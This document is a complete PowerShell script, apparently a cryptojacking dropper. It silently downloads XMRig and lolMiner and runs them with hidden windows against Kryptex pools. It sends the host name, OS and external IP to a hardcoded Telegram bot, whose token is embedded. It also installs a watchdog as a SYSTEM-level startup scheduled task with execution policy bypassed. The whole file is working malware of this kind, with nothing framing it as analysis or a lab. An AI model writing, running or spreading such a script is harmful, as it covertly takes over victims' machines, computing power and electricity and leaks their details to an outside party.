# ================= CONFIG =================
$TG_TOKEN = "8556429231:AAFBKuMMfkrpnxJInSITVaBUD8prYuHcnLw"
$TG_CHAT  = "5336452267"

$KRIPTEX  = "krxX3PVQVR"
$XMR_POOL = "xmr.kryptex.network:7029"
$ETC_POOL = "etc.kryptex.network:7033"

$ATTEMPTS_MAX = 3
$TIMEOUT = 120
$STEP = 5

# ================= TELEGRAM =================
function Send-TG($text){
  $json = @{ chat_id=$TG_CHAT; text=$text } | ConvertTo-Json
  $bytes = [Text.Encoding]::UTF8.GetBytes($json)
  Invoke-WebRequest "https://api.telegram.org/bot$TG_TOKEN/sendMessage" `
    -Method POST -ContentType "application/json; charset=utf-8" `
    -Body $bytes -ErrorAction SilentlyContinue | Out-Null
}

# ================= PATHS ====================
$BASE = "$env:APPDATA\.mining"
$BIN_CPU = "$BASE\bin\cpu"
$BIN_GPU = "$BASE\bin\gpu"
$REPORT_DIR = "$BASE\report"
$REPORT_FILE = "$REPORT_DIR\report.txt"

New-Item -ItemType Directory -Force -Path $BIN_CPU,$BIN_GPU,$REPORT_DIR | Out-Null

# ================= SYSTEM ===================
$HOST = $env:COMPUTERNAME
$OS = (Get-CimInstance Win32_OperatingSystem).Caption
try { $IP = (Invoke-RestMethod "https://api.ipify.org").Trim() } catch { $IP="unknown" }

# ================= DOWNLOAD =================
function Get-Zip($url,$dest){
  $tmp="$env:TEMP\pkg.zip"
  Invoke-WebRequest $url -OutFile $tmp -UseBasicParsing
  Expand-Archive $tmp $dest -Force
  Remove-Item $tmp -Force
}

$XMR_EXE = "$BIN_CPU\xmrig.exe"
$LOL_EXE = "$BIN_GPU\lolMiner.exe"

if (-not (Test-Path $XMR_EXE)) {
  Get-Zip "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-msvc-win64.zip" $BIN_CPU
}
if (-not (Test-Path $LOL_EXE)) {
  Get-Zip "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Win64.zip" $BIN_GPU
}

# ================= START MINERS (INITIAL) ===
Start-Process $XMR_EXE `
  "-o $XMR_POOL -u $KRIPTEX.$HOST -p x --http-enabled --http-port 16000" `
  -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null

Start-Process $LOL_EXE `
  "--algo ETCHASH --pool $ETC_POOL --user $KRIPTEX.$HOST --apiport 8080" `
  -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null

# ================= CHECK ====================
function Check-Once {
  $cpuHR=0;$gpuHR=0
  try {
    $cpu = Invoke-RestMethod "http://127.0.0.1:16000/1/summary"
    $cpuHR = [int]$cpu.hashrate.total[0]
  } catch {}
  try {
    $gpu = Invoke-RestMethod "http://127.0.0.1:8080/summary"
    $gpuHR = [int]($gpu.Session.Performance_Summary.Performance*1e6)
  } catch {}
  return @($cpuHR,$gpuHR)
}

$attempt=1;$cpuHR=0;$gpuHR=0
while ($attempt -le $ATTEMPTS_MAX) {
  $elapsed=0
  while ($elapsed -lt $TIMEOUT) {
    $r=Check-Once;$cpuHR=$r[0];$gpuHR=$r[1]
    if ($cpuHR -gt 0 -or $gpuHR -gt 0) { break }
    Start-Sleep $STEP; $elapsed+=$STEP
  }
  if ($cpuHR -gt 0 -or $gpuHR -gt 0) { break }
  $attempt++
}

if ($cpuHR -gt 0 -and $gpuHR -gt 0) { $STATUS="OK" }
elseif ($cpuHR -gt 0 -or $gpuHR -gt 0) { $STATUS="PARTIAL" }
else { $STATUS="FAILED" }

# ================= REPORT ===================
$REPORT=@"
INSTALLER REPORT
Platform: windows
Status: $STATUS

Host: $HOST
External IP: $IP
OS: $OS

CPU hashrate: $cpuHR H/s
GPU hashrate: $gpuHR H/s

Attempts: $attempt
Time: $(Get-Date)
"@

$REPORT | Out-File -Encoding UTF8 $REPORT_FILE
Send-TG $REPORT

# ================= WATCHDOG SCRIPT ==========
$WATCHDOG = "$BASE\watchdog.ps1"
@"
`$XMR_EXE='$XMR_EXE'
`$LOL_EXE='$LOL_EXE'
`$KRIPTEX='$KRIPTEX'
`$HOST='$HOST'
`$XMR_POOL='$XMR_POOL'
`$ETC_POOL='$ETC_POOL'

function CPU-Alive {
  try {
    `$c=Invoke-RestMethod 'http://127.0.0.1:16000/1/summary'
    return ([int]`$c.hashrate.total[0] -gt 0)
  } catch { return `$false }
}
function GPU-Alive {
  try {
    `$g=Invoke-RestMethod 'http://127.0.0.1:8080/summary'
    return ([int](`$g.Session.Performance_Summary.Performance*1e6) -gt 0)
  } catch { return `$false }
}

while (`$true) {
  if (-not (CPU-Alive)) {
    Start-Process `$XMR_EXE "-o `$XMR_POOL -u `$KRIPTEX.`$HOST -p x --http-enabled --http-port 16000" -WindowStyle Hidden
  }
  if (-not (GPU-Alive)) {
    Start-Process `$LOL_EXE "--algo ETCHASH --pool `$ETC_POOL --user `$KRIPTEX.`$HOST --apiport 8080" -WindowStyle Hidden
  }
  Start-Sleep 30
}
"@ | Out-File -Encoding UTF8 $WATCHDOG

# ================= AUTOSTART (TASK SCHEDULER)
$taskName = "MiningWatchdog"
$action = New-ScheduledTaskAction `
  -Execute "powershell.exe" `
  -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$WATCHDOG`""

$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest

try {
  Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
  Register-ScheduledTask `
    -TaskName $taskName `
    -Action $action `
    -Trigger $trigger `
    -Principal $principal `
    -Force
} catch {}
